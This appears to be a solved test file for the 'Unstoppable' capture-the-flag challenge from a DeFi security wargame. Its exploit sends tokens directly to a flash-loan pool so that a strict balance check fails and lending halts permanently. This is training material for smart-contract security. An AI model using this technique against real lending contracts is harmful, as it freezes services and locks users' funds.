const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
         await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        /* Description goal is If only there was a way to attack and stop the pool from offering flash loans
        To stop flash loan, we check flashloan function in UnstoppableLender.sol
        It has condition check that "poolBalance == balanceBefore".So, let's take a look how poolBalance come.
        poolBalance will change only from function depositTokens which require to input amount token
        refer to https://docs.openzeppelin.com/contracts/2.x/api/token/erc721
        pattern function transferFrom is "transferFrom(from, to, tokenId)" but we not have tokenId
        So, we try transfer directly to contract address by ERC20 strandard 
        function transfer(address _to, uint256 _value) 
        */

        console.log("Balance before exploit");
        let poolBalance = await this.token.balanceOf(this.pool.address);
        console.log("Pool balance :" + ethers.utils.formatEther(poolBalance.toString())); 

        let attackerBalance = await this.token.balanceOf(attacker.address);
        console.log("Attacker balance :" + ethers.utils.formatEther(attackerBalance.toString())); 
        
        await this.token.connect(attacker).transfer(this.pool.address, ethers.utils.parseEther('1'));      // send 1 ether

        console.log("----------------------------------------------");
        console.log("Balance after exploited");

        poolBalance = await this.token.balanceOf(this.pool.address);
        console.log("Pool balance :" + ethers.utils.formatEther(poolBalance.toString())); 

        attackerBalance = await this.token.balanceOf(attacker.address);
        console.log("Attacker balance :" + ethers.utils.formatEther(attackerBalance.toString()));
            
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
